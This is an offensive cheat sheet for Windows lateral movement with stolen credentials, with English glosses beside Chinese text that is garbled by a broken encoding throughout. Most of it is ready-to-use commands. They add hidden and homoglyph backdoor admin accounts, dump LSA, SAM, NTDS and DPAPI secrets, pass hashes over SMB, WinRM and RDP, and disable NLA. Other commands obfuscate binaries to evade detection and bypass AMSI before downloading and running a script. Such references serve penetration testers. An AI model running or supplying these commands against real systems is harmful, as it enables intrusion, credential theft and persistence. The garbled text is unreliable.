# Windows - 浣跨敤鍑瘉 (Using credentials)

## 鎽樿 (Summary)

* [鑾峰彇鍑嵁 (Get Credentials)](#get-credentials)
    * [鍒涘缓鍑嵁 (Create Credential)](#create-credential)
    * [鎺犲ず鍑嵁 (Looting Credentials)](#looting-credentials)
    * [Guest 鍑嵁 (Guest Credential)](#guest-credential)
    * [Retail 鍑嵁 (Retail Credential)](#retail-credential)
    * [娌欑洅鍑嵁 (Sandbox Credential)](#sandbox-credential)
* [NetExec](#netexec)
* [Impacket](#impacket)
    * [PSExec](#psexec)
    * [WMIExec](#wmiexec)
    * [SMBExec](#smbexec)
* [RDP 杩滅▼妗岄潰鍗忚 (RDP Remote Desktop Protocol)](#rdp-remote-desktop-protocol)
* [Powershell 杩滅▼鍗忚 (Powershell Remoting Protocol)](#powershell-remoting-protocol)
    * [Powershell 鍑嵁 (Powershell Credentials)](#powershell-credentials)
    * [Powershell PSSESSION](#powershell-pssession)
    * [Powershell 瀹夊叏瀛楃涓?(Powershell Secure String)](#powershell-secure-string)
* [SSH 鍗忚 (SSH Protocol)](#ssh-protocol)
* [WinRM 鍗忚 (WinRM Protocol)](#winrm-protocol)
* [WMI 鍗忚 (WMI Protocol)](#wmi-protocol)
* [鍏朵粬鏂规硶 (Other Methods)](#other-methods)
    * [PsExec - Sysinternals](#psexec---sysinternals)
    * [鎸傝浇杩滅▼鍏变韩 (Mount a remote share)](#mount-a-remote-share)
    * [浣滀负鍏朵粬鐢ㄦ埛杩愯 (Run as another user)](#run-as-another-user)

## 鑾峰彇鍑嵁 (Get Credentials)

### 鍒涘缓鍑嵁 (Create Credential)

```powershell
net user hacker Hcker_12345678* /add /Y
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add # RDP 璁块棶 (RDP access)
net localgroup "Backup Operators" hacker /add # 瀵规枃浠剁殑瀹屽叏璁块棶鏉冮檺 (Full access to files)
net group "Domain Admins" hacker /add /domain

# 鍚敤鍩熺敤鎴峰笎鎴?(enable a domain user account)
net user hacker /ACTIVE:YES /domain

# 闃绘鐢ㄦ埛鏇存敼鍏跺瘑鐮?(prevent users from changing their password)
net user username /Passwordchg:No

# 闃叉瀵嗙爜杩囨湡 (prevent the password to expire)
net user hacker /Expires:Never

# 鍒涘缓涓€涓満鍣ㄨ处鎴凤紙涓嶄細鏄剧ず鍦?net users 涓級 (create a machine account (not shown in net users))
net user /add evilbob$ evilpassword

# 鍚屽舰瀛?A詠m褨nistrat慰r锛堜笉鍚屼簬 Administrator锛?(homoglyph A詠m褨nistrat慰r (different of Administrator))
A詠m褨nistrat慰r
```

鍏充簬浣犵殑鐢ㄦ埛鐨勪竴浜涗俊鎭?(Some info about your user)

```powershell
net user /dom
net user /domain
```

### 鎺犲ず鍑嵁 (Looting Credentials)

```ps1
nxc smb 10.10.10.10 -u username -p password -d domain --lsa
nxc smb 10.10.10.10 -u username -p password -d domain --sam
nxc smb 10.10.10.10 -u username -p password -d domain --dpapi nosystem
nxc smb 10.10.10.10 -u username -p password -d domain --dpapi cookies
nxc smb 10.10.10.10 -u username -p password -d domain --dpapi
nxc smb 10.10.10.10 -u username -p password -d domain --sccm
nxc smb 10.10.10.10 -u username -p password -d domain --ntds
nxc smb 10.10.10.10 -u username -p password -d domain -M lsassy
nxc smb 10.10.10.10 -u username -p password -d domain -M nanodump
nxc smb 10.10.10.10 -u username -p password -d domain -M veeam
nxc smb 10.10.10.10 -u username -p password -d domain -M winscp
nxc smb 10.10.10.10 -u username -p password -d domain -M putty
nxc smb 10.10.10.10 -u username -p password -d domain -M vnc
nxc smb 10.10.10.10 -u username -p password -d domain -M mremoteng
nxc smb 10.10.10.10 -u username -p password -d domain -M rdcman
```

### Guest 鍑嵁 (Guest Credential)

榛樿鎯呭喌涓嬶紝姣忓彴 Windows 鏈哄櫒閮芥湁涓€涓?Guest 甯愭埛锛屽叾榛樿瀵嗙爜涓虹┖銆?(By default every Windows machine comes with a Guest account, its default password is empty.)

```powershell
Username: Guest
Password: [EMPTY]
NT Hash: 31d6cfe0d16ae931b73c59d7e0c089c0
```

### Retail 鍑嵁 (Retail Credential)

Retail 鍑嵁 (Retail Credential) [@m8urnett on Twitter](https://twitter.com/m8urnett/status/1003835660380172289)

褰撲綘鍦?Retail锛堥浂鍞級婕旂ず妯″紡涓嬭繍琛?Windows 鏃讹紝瀹冧細鍒涘缓涓€涓悕涓?Darrin DeYoung 鐨勭敤鎴峰拰涓€涓鐞嗗憳 RetailAdmin (when you run Windows in retail demo mode, it creates a user named Darrin DeYoung and an admin RetailAdmin)

```powershell
Username: RetailAdmin
Password: trs10
```

### 娌欑洅鍑嵁 (Sandbox Credential)

WDAGUtilityAccount - [@never_released on Twitter](https://twitter.com/never_released/status/1081569133844676608)

浠?Windows 10 鐗堟湰 1709 (Fall Creators Update) 寮€濮嬶紝瀹冩槸 Windows Defender 搴旂敤闃叉姢鐨勪竴閮ㄥ垎銆?(Starting with Windows 10 version 1709 (Fall Creators Update), it is part of Windows Defender Application Guard)

```powershell
\\windowssandbox
Username: wdagutilityaccount
Password: pw123
```

## netexec

浣跨敤 [mpgn/netexec](https://github.com/Pennyw0rth/NetExec) (Using [mpgn/netexec](https://github.com/Pennyw0rth/NetExec))

* netexec 鏀寔澶氱鍗忚 (netexec supports many protocols)

    ```powershell
    netexec ldap 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
    netexec mssql 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
    netexec rdp 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" 
    netexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
    netexec winrm 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
    ```

* netexec 鏀寔瀵嗙爜銆丯T 鍝堝笇鍜?Kerberos 韬唤楠岃瘉 (netexec works with password, NT hash and Kerberos authentication)

    ```powershell
    netexec smb 192.168.1.100 -u Administrator -p "Password123?" # Password (瀵嗙爜)
    netexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" # NT Hash (NT 鍝堝笇)
    export KRB5CCNAME=/tmp/kerberos/admin.ccache; netexec smb 192.168.1.100 -u admin --use-kcache # Kerberos
    ```

## Impacket

鏉ヨ嚜 [fortra/impacket](https://github.com/fortra/impacket) (:warning: resnamed to impacket-xxxxx in Kali)
:warning: wmiexec銆乸sexec銆乻mbexec 鍜?dcomexec 鐨?`get` / `put` 姝ｅ湪鏇存敼涓?`lget` 鍜?`lput`銆?(`get` / `put` for wmiexec, psexec, smbexec, and dcomexec are changing to `lget` and `lput`.)
:warning: 娉曡瀛楃鍙兘鏃犳硶姝ｇ‘鏄剧ず鍦ㄤ綘鐨勮緭鍑轰腑锛岃浣跨敤 `-codec ibm850` 瑙ｅ喅姝ら棶棰樸€?(French characters might not be correctly displayed on your output, use `-codec ibm850` to fix this.)
:warning: 榛樿鎯呭喌涓嬶紝Impacket 鐨勮剼鏈瓨鍌ㄥ湪 examples 鏂囦欢澶逛腑锛歚impacket/examples/psexec.py`銆?(By default, Impacket's scripts are stored in the examples folder: `impacket/examples/psexec.py`.)

鎵€鏈?Impacket 鐨?*exec 鑴氭湰閮戒笉鐩哥瓑锛屽畠浠皢浠ユ墭绠″湪澶氫釜绔彛涓婄殑鏈嶅姟涓虹洰鏍囥€?(All Impacket's *exec scripts are not equal, they will target services hosted on multiples ports.)
涓嬭〃鎬荤粨浜嗘瘡涓剼鏈娇鐢ㄧ殑绔彛銆?(The following table summarize the port used by each scripts.)

| 鏂规硶 (Method)| 浣跨敤鐨勭鍙?(Port Used)                | 闇€瑕佺鐞嗗憳鏉冮檺 (Admin Required) |
|-------------|---------------------------------------|----------------|
| psexec.py   | tcp/445                               | Yes            |
| smbexec.py  | tcp/445                               | No             |
| atexec.py   | tcp/445                               | No             |
| dcomexec.py | tcp/135, tcp/445, tcp/49751 (DCOM)    | No             |
| wmiexec.py  | tcp/135, tcp/445, tcp/50911 (Winmgmt) | Yes            |

* `psexec`: 鐩稿綋浜庝娇鐢?RemComSvc 浜岃繘鍒舵枃浠剁殑 Windows PSEXEC銆?(`psexec`: equivalent of Windows PSEXEC using RemComSvc binary.)

    ```ps1
    psexec.py DOMAIN/username:password@10.10.10.10
    ```

* `smbexec`: 涓€绉嶄笉浣跨敤 RemComSvc 鐨勭被浼间簬 PSEXEC 鐨勬柟娉?(a similar approach to PSEXEC w/o using RemComSvc)

    ```ps1
    smbexec.py DOMAIN/username:password@10.10.10.10
    ```

* `atexec`: 閫氳繃浠诲姟璁″垝绋嬪簭鏈嶅姟鍦ㄧ洰鏍囨満鍣ㄤ笂鎵ц涓€鏉″懡浠わ紝骞惰繑鍥炲凡鎵ц鍛戒护鐨勮緭鍑恒€?(executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.)

    ```ps1
    atexec.py DOMAIN/username:password@10.10.10.10
    ```

* `dcomexec`: 绫讳技浜?wmiexec.py 鐨勫崐浜や簰寮?shell锛屼絾浣跨敤涓嶅悓鐨?DCOM 绔偣 (a semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints)

    ```ps1
    dcomexec.py DOMAIN/username:password@10.10.10.10
    ```

* `wmiexec`: 涓€涓崐浜や簰寮?shell锛岄€氳繃 Windows Management Instrumentation 浣跨敤銆?棣栧厛锛屽畠浣跨敤绔彛 tcp/135 鍜?tcp/445锛屾渶鍚庯紝瀹冮€氳繃鍔ㄦ€佸垎閰嶇殑楂樼鍙ｏ紙渚嬪 tcp/50911锛変笌 Winmgmt Windows 鏈嶅姟杩涜閫氫俊銆?a semi-interactive shell, used through Windows Management Instrumentation. First it uses ports tcp/135 and tcp/445, and ultimately it communicates with the Winmgmt Windows service over dynamically allocated high port such as tcp/50911.)

    ```ps1
    wmiexec.py DOMAIN/username:password@10.10.10.10
    wmiexec.py DOMAIN/username@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
    ```

瑕佸厑璁搁潪 RID 500 鏈湴绠＄悊鍛樿处鎴锋墽琛?Wmi 鎴?PsExec锛岃鎵ц锛?To allow Non-RID 500 local admin accounts performing Wmi or PsExec, execute:)
`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /f /d 1`
瑕侀樆姝?RID 500 鎵ц WmiExec 鎴?PsExec锛岃鎵ц锛?To prevent RID 500 from being able to WmiExec or PsExec, execute:)
`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v FilterAdministratorToken /t REG_DWORD /f /d 1`

### PSExec

瀹冧笉浼氫笂浼?`psexeccsv` 鏈嶅姟浜岃繘鍒舵枃浠讹紝鑰屾槸鍚?`ADMIN$` 涓婁紶鍏锋湁浠绘剰鍚嶇О鐨勬湇鍔′簩杩涘埗鏂囦欢銆?(Instead of uploading `psexeccsv` service binary, it uploads to `ADMIN$` a service binary with an arbitrary name.)
PSExec 榛樿鐨?[kavika13/RemCom](https://github.com/kavika13/RemCom) 浜岃繘鍒舵枃浠跺凡缁忔湁 10 骞村巻鍙诧紝浣犲彲鑳芥兂瑕侀噸寤哄苟娣锋穯瀹冧互鍑忓皯妫€娴?([snovvcrash/RemComObf.sh](https://gist.github.com/snovvcrash/123945e8f06c7182769846265637fedb)) (PSExec default [kavika13/RemCom](https://github.com/kavika13/RemCom) binary is 10 years old, you might want to rebuild it and obfuscate it to reduce detections ([snovvcrash/RemComObf.sh](https://gist.github.com/snovvcrash/123945e8f06c7182769846265637fedb)))

浣跨敤鑷畾涔夌殑浜岃繘鍒舵枃浠跺拰鎷ユ湁鑷畾涔夋湇鍔″悕绉扮殑鍛戒护锛?Use a custom binary and service name with :) `psexec.py Administrator:Password123@IP -service-name customservicename -remote-binary-name custombin.exe`

姝ゅ锛屽彲浠ラ€氳繃鍙傛暟鎸囧畾鑷畾涔夋枃浠讹細(Also a custom file can be specified with the parameter :) `-file /tmp/RemComSvcCustom.exe`.
浣犻渶瑕佹洿鏂扮閬撳悕绉帮紝浠ュ湪绗?163 琛屽尮閰?"Custom_communication"锛?You need to update the pipe name to match "Custom_communication" in the line 163)

```py
162    tid = s.connectTree('IPC$')
163    fid_main = self.openPipe(s,tid,r'\RemCom_communicaton',0x12019f)
```

鎴栬€呬綘鍙互浣跨敤 fork 鐗堢殑 [ThePorgs/impacket](https://github.com/ThePorgs/impacket/pull/3/files)銆?(Alternatively you can use the fork [ThePorgs/impacket](https://github.com/ThePorgs/impacket/pull/3/files).)

### WMIExec

浣跨敤闈為粯璁ゅ叡浜?`-share SHARE` 鏉ュ啓鍏ヨ緭鍑轰互鍑忓皯妫€娴嬨€?(Use a non default share `-share SHARE` to write the output to reduce the detection.)
榛樿鎯呭喌涓嬶紝姝ゅ懡浠ゅ皢琚墽琛岋細(By default this command is executed:)

```ps1
cmd.exe /Q /c cd 1> \\127.0.0.1\ADMIN$\__RANDOM 2>&1
```

### SMBExec

瀹冧娇鐢ㄥ悕绉?`BTOBTO` ([smbexec.py#L59](https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L59)) 鍒涘缓涓€涓湇鍔★紝骞跺皢鏀诲嚮鑰呯殑鍛戒护鍦ㄤ竴涓綅浜?`%TEMP/execute.bat` 鐨?bat 鏂囦欢涓紶杈?([smbexec.py#L56](https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L56))銆?It creates a service with the name `BTOBTO` ([smbexec.py#L59](https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L59)) and transfers commands from the attacker in a bat file in `%TEMP/execute.bat` ([smbexec.py#L56](https://github.com/fortra/impacket/blob/master/examples/smbexec.py#L56)).)

```py
OUTPUT_FILENAME = '__output'
BATCH_FILENAME  = 'execute.bat'
SMBSERVER_DIR   = '__tmp'
DUMMY_SHARE     = 'TMP'
SERVICE_NAME    = 'BTOBTO'
```

鎴戜滑姣忔鎵ц涓€鏉″懡浠ゆ椂锛屽畠閮戒細鍒涘缓涓€涓柊鏈嶅姟銆傚畠杩樺皢鐢熸垚浜嬩欢 7045銆?(It will create a new service every time we execute a command. It will also generate an Event 7045.)

榛樿鎯呭喌涓嬶紝姝ゅ懡浠ゅ皢琚墽琛?(By default this command is executed:) `%COMSPEC% /Q /c echo dir > \\127.0.0.1\C$\__output 2>&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat`锛屽叾涓?`%COMSPEC%` 鎸囧悜 `C:\WINDOWS\system32\cmd.exe`銆?where `%COMSPEC%` points to `C:\WINDOWS\system32\cmd.exe`.)

```py
class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName, shell_type):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__mode = mode
        self.__output = '\\\\127.0.0.1\\' + self.__share + '\\' + OUTPUT_FILENAME
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
        self.__outputBuffer = b''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__shell_type = shell_type
        self.__pwsh = 'powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc '
        self.__serviceName = serviceName
```
## RDP 杩滅▼妗岄潰鍗忚 (RDP Remote Desktop Protocol)

:warning: **娉ㄦ剰**锛氫綘鍙兘闇€瑕佸惎鐢?RDP 骞剁鐢?NLA 骞朵慨澶?CredSSP 閿欒銆?(**NOTE**: You may need to enable RDP and disable NLA and fix CredSSP errors.)

* 鍚敤 RDP (Enable RDP)

    ```powershell
    PS C:\> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
    PS C:\> netsh firewall set service remoteadmin enable
    PS C:\> netsh firewall set service remotedesktop enable

    # 鏇夸唬鏂规硶 (Alternative)
    C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
    root@payload$ netexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
    ```

* 淇 **CredSSP** 閿欒 (Fix **CredSSP** errors)

    ```ps1
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
    ```

**缃戠粶绾ц韩浠介獙璇?(Network Level Authentication)** 鍦ㄨ繙绋嬫闈細璇濆畬鍏ㄥ缓绔嬩箣鍓嶏紝瑕佹眰鐢ㄦ埛杩涜韬唤楠岃瘉銆傝繖鍙戠敓鍦ㄥ姞杞借繙绋嬫闈㈡帴鍙ｄ箣鍓嶏紝闄嶄綆浜嗘煇浜涙敾鍑荤殑椋庨櫓銆?(**Network Level Authentication** requires the user to authenticate before a remote desktop session is fully established. This happens before the remote desktop interface is loaded, reducing the risk of certain attacks.)

* 鍦ㄧ鐢?NLA 鏃惰繘琛屽睆骞曟埅鍥?(Take screenshot when NLA is disabled)

    ```ps1
    netexec rdp 10.10.10.10 -u user -p pass --nla-screenshot
    ```

* 绂佺敤缃戠粶绾у埆韬唤楠岃瘉 (NLA) (Disable Network Level Authentication (NLA))

    ```ps1
    PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
    PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
    ```

鍦?Windows 涓婏紝鍘熺敓鐨勮繙绋嬫闈㈠鎴风鏄?`mstsc.exe`銆?(On Windows, the native Remote Desktop client is `mstsc.exe`.)
浣跨敤 `/public` 寮€鍏冲惎鍔ㄦ椂锛孯DP 鍦ㄥ叕鍏辨ā寮?(Public Mode) 涓嬭繍琛岋紝璇ユā寮忎娇鐢ㄤ复鏃剁殑銆侀潪鎸佷箙鎬х殑浼氳瘽璁剧疆銆?When launched with the `/public` switch, RDP runs in Public Mode, which uses temporary, non-persistent session settings.)

```ps1
mstsc /public /v:server01
```

鍏叡妯″紡 (Public Mode) 涓撲负鍏变韩绯荤粺銆佽烦鏉挎満鍜屽畨鍏ㄦ晱鎰熺幆澧冭€岃璁★紝鍦ㄨ繖浜涚幆澧冧腑锛屼繚鐣欐湰鍦板伐浠舵垨缂撳瓨鍑嵁浼氬甫鏉ユ搷浣滈闄┿€?(Public Mode is designed for shared systems, jump hosts, and security-sensitive environments, where leaving local artifacts or cached credentials would present an operational risk.)

鍦ㄥ叕鍏辨ā寮忎笅鍚姩 RDP 鏃讹紝瀹㈡埛绔皢锛?(When RDP is launched in Public Mode, the client will:)

* 涓嶄繚瀛樺嚟鎹?(Not save credentials)
* 涓嶄娇鐢ㄧ紦瀛樼殑鍑嵁 (Not use cached credentials)
* 涓嶄繚瀛樿繛鎺ヨ褰?(Not save connection history)
* 涓嶅姞杞芥湰鍦?RDP 璁剧疆锛堟墦鍗版満銆侀┍鍔ㄥ櫒銆佸壀璐存澘绛夛級 (Not load local RDP settings (printers, drives, clipboard, etc.))
* 涓嶅湪鍑嵁绠＄悊鍣ㄤ腑瀛樺偍瀵嗙爜 (Not store passwords in Credential Manager)

濡傛灉鍚姩 RDP 鏃舵病鏈?`/public`锛屾湰鍦板伐浠跺彲鑳戒細淇濈暀銆?(If RDP was launched without /public, local artifacts may persist.)
鍙互浣跨敤浠ヤ笅 PowerShell 鍛戒护鎵嬪姩鍒犻櫎杩欎簺鍐呭銆?(These can be manually removed using the following PowerShell commands.)

```ps1
# 鍒犻櫎瀛樺偍鐨?RDP 鍑嵁 (Remove Stored RDP Credentials)
cmdkey /list | ? { $_ -Match "TERMSRV/" } | % { $_ -Replace ".*: " } | % { cmdkey /delete:$_ }

# 鍒犻櫎缂撳瓨鐨勪綅鍥惧拰瀹㈡埛绔暟鎹?(Remove Cached Bitmaps and Client Data)
Remove-Item -Path "$Env:LocalAppData\Microsoft\Terminal Server Client\Cache" -Recurse -ErrorAction SilentlyContinue

# 鍒犻櫎 RDP 杩炴帴鍘嗗彶鍜岃澶囨槧灏?(Remove RDP Connection History and Device Mappings)
Remove-Item -Path "HKCU:\Software\Microsoft\Terminal Server Client\Default" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Terminal Server Client\LocalDevices" -Recurse -Force -ErrorAction SilentlyContinue
```

婊ョ敤 RDP 鍗忚锛屼娇鐢ㄤ互涓嬪懡浠よ繙绋嬫墽琛屽懡浠わ細 (Abuse RDP protocol to execute commands remotely with the following commands:)

* [Pennyw0rth/netexec](https://github.com/Pennyw0rth/NetExec)

    ```ps1
    netexec rdp 10.10.10.10 -u user -p pass
    ```

* [rdesktop](http://www.rdesktop.org/)

    ```powershell
    root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare
    root@payload$ rdesktop -u username -p password -g 70% -r disk:share=/tmp/myshare 10.10.10.10
    # -g : 灞忓箷灏嗗崰鎹疄闄呭睆骞曞ぇ灏忕殑 70% (the screen will take up 70% of your actual screen size)
    # -r disk:share : 鍦ㄨ繙绔闈細璇濋樁娈靛叡浜湰鍦版枃浠跺す (sharing a local folder during a remote desktop session)
    ```

* [freerdp](https://www.freerdp.com)

    ```powershell
    root@payload$ xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768 /smart-sizing
    root@payload$ xfreerdp /v:10.0.0.1 /u:username # password will be asked
    
    # 浣跨敤鍙楅檺绠＄悊鍛?(Restricted Admin) 浼犻€掑搱甯岋紝闇€瑕佷竴涓笉鍦?"Remote Desktop Users" 缁勪腑鐨勭鐞嗗憳甯愭埛銆?(pass the hash using Restricted Admin, need an admin account not in the "Remote Desktop Users" group.)
    # 浼犻€掑搱甯岄€傜敤浜?Server 2012 R2 / Win 8.1+ (pass the hash works for Server 2012 R2 / Win 8.1+)
    # 闇€瑕?freerdp2-x11 freerdp2-shadow-x11 杞欢鍖咃紝鑰屼笉鏄?freerdp-x11 (require freerdp2-x11 freerdp2-shadow-x11 packages instead of freerdp-x11)
    root@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d  
    ```

* [0xthirteen/SharpRDP](https://github.com/0xthirteen/SharpRDP)

    ```powershell
    PS C:\> SharpRDP.exe computername=target.domain command="C:\Temp\file.exe" username=domain\user password=password
    ```

## Powershell 杩滅▼鍗忚 (Powershell Remoting Protocol)

### Powershell 鍑嵁 (Powershell Credentials)

```ps1
PS> $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force
PS> $cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\Username', $pass)
```

### Powershell PSSESSION

* 鍦ㄤ富鏈轰笂鍚敤 PSRemoting (Enable PSRemoting on the host)

    ```ps1
    Enable-PSRemoting -Force
    net start winrm  

    # 灏嗘満鍣ㄦ坊鍔犲埌淇′换涓绘満 (Add the machine to the trusted hosts)
    Set-Item wsman:\localhost\client\trustedhosts *
    Set-Item WSMan:\localhost\Client\TrustedHosts -Value "10.10.10.10"
    ```

* 鎵ц鍗曟潯鍛戒护 (Execute a single command)

    ```powershell
    PS> Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami }
    PS> Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service }
    PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\Scripts\Task.ps1
    ```

* 涓?PS 浼氳瘽浜や簰 (Interact with a PS Session)

    ```powershell
    PS> Enter-PSSession -computerName DC01
    [DC01]: PS>

    # 涓€瀵逛竴鎵ц鑴氭湰鍜屽懡浠?(one-to-one execute scripts and commands)
    PS> $Session = New-PSSession -ComputerName CLIENT1
    PS> Invoke-Command -Session $Session -scriptBlock { $test = 1 }
    PS> Invoke-Command -Session $Session -scriptBlock { $test }
    1
    ```

### Powershell 瀹夊叏瀛楃涓?(Powershell Secure String)

```ps1
$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)
$secureObject = ConvertTo-SecureString -String "76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=" -Key $aesKey
$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
$decrypted
```

## WinRM 鍗忚 (WinRM Protocol)

**鐜瑕佹眰 (Requirements)**锛?
* 寮€鏀?**5985** 鎴?**5986** 绔彛銆?(Port **5985** or **5986** open.)
* 榛樿绔偣涓?**/wsman** (Default endpoint is **/wsman**)

濡傛灉绯荤粺涓婄鐢ㄤ簡 WinRM锛屽彲浠ヤ娇鐢ㄤ互涓嬪懡浠ゅ惎鐢ㄥ畠锛?(If WinRM is disabled on the system you can enable it using:) `winrm quickconfig`

鍦?Linux 涓婇€氳繃 WinRM 杩涜浜や簰鐨勬渶绠€鍗曟柟娉曟槸浣跨敤 [Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm) (The easiest way to interact over WinRM on Linux is with [Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm))

```powershell
evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM]
evil-winrm -i 10.0.0.20 -u username -H HASH
evil-winrm -i 10.0.0.20 -u username -p password -r domain.local

*Evil-WinRM* PS > Bypass-4MSI
*Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString("http://127.0.0.1/PowerView.ps1"))
```

## WMI 鍗忚 (WMI Protocol)

```powershell
PS C:\> wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe鈥?```

## SSH 鍗忚 (SSH Protocol)

:warning: 浣犱笉鑳藉 SSH 浼犻€掑搱甯屻€?(You cannot pass the hash to SSH)

* 浣跨敤鍩熺敤鎴?(Domain User) 鐨勭敤鎴峰悕/瀵嗙爜寤虹珛杩炴帴 (Connect using username/password of a Domain User)

    ```ps1
    ssh -l user@domain 192.168.1.1
    ```

* 浣跨敤 Kerberos 绁ㄦ嵁杩炴帴 (Connect with a Kerberos ticket)

    ```ps1
    cp user.ccache /tmp/krb5cc_1045
    ssh -o GSSAPIAuthentication=yes user@domain.local -vv
    ```

## 鍏朵粬鏂规硶 (Other Methods)

### PsExec - Sysinternals

鏉ヨ嚜 Windows - [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/) (From Windows - [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/))

```powershell
PsExec.exe  \\srv01.domain.local -u DOMAIN\username -p password cmd.exe

# 鍒囨崲绠＄悊鍛樻潈闄愯嚦 NT Authority/System (switch admin user to NT Authority/System)
PsExec.exe  \\srv01.domain.local -u DOMAIN\username -p password cmd.exe -s 
```

Sysinternals 鍙互浣跨敤 Windows 鍖呯鐞嗗櫒 (Windows Package Manager) 瀹夎锛屾垨鑰呬粠 [live.sysinternals.com](https://live.sysinternals.com/) 涓嬭浇銆?Sysinternals can be installed using the Windows Package Manager or downloaded from [live.sysinternals.com](https://live.sysinternals.com/).)

```ps1
winget install --id Microsoft.Sysinternals.Suite
winget install Microsoft.sysinternals --accept-source-agreements --accept-package-agreements 
```

### 鎸傝浇杩滅▼鍏变韩 (Mount a remote share)

```powershell
net use \\srv01.domain.local /user:DOMAIN\username password C$
```

### 浣滀负鍏朵粬鐢ㄦ埛杩愯 (Run as another user)

Runas 鏄?Windows Vista 涓唴缃殑鍛戒护琛屽伐鍏枫€?(Runas is a command-line tool that is built into Windows Vista.)
鍏佽鐢ㄦ埛浣跨敤涓嶅悓浜庡綋鍓嶇櫥褰曠敤鎴锋彁渚涚殑鏉冮檺杩愯鐗瑰畾宸ュ叿鍜岀▼搴忋€?(Allows a user to run specific tools and programs with different permissions than the user's current logon provides.)

```powershell
runas /netonly /user:DOMAIN\username "cmd.exe"
runas /noprofil /netonly /user:DOMAIN\username cmd.exe
```

## 鍙傝€冭祫鏂?(References)

* [Ropnop - Using credentials to own Windows boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
* [Ropnop - Using credentials to own Windows boxes Part 2](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
* [Gaining Domain Admin from Outside Active Directory](https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html)
* [Impacket Remote code execution on Windows from Linux by Vry4n_ - Jun 20, 2021](https://vk9-sec.com/impacket-remote-code-execution-rce-on-windows-from-linux/)
* [Impacket Exec Commands Cheat Sheet - 13cubed](https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet.pdf)
* [SMB protocol cheatsheet - aas-s3curity](https://aas-s3curity.gitbook.io/cheatsheet/internalpentest/active-directory/post-exploitation/lateral-movement/smb-protocol)
* [Windows Lateral Movement with smb, psexec and alternatives - nv2lt](https://nv2lt.github.io/windows/smb-psexec-smbexec-winexe-how-to/)
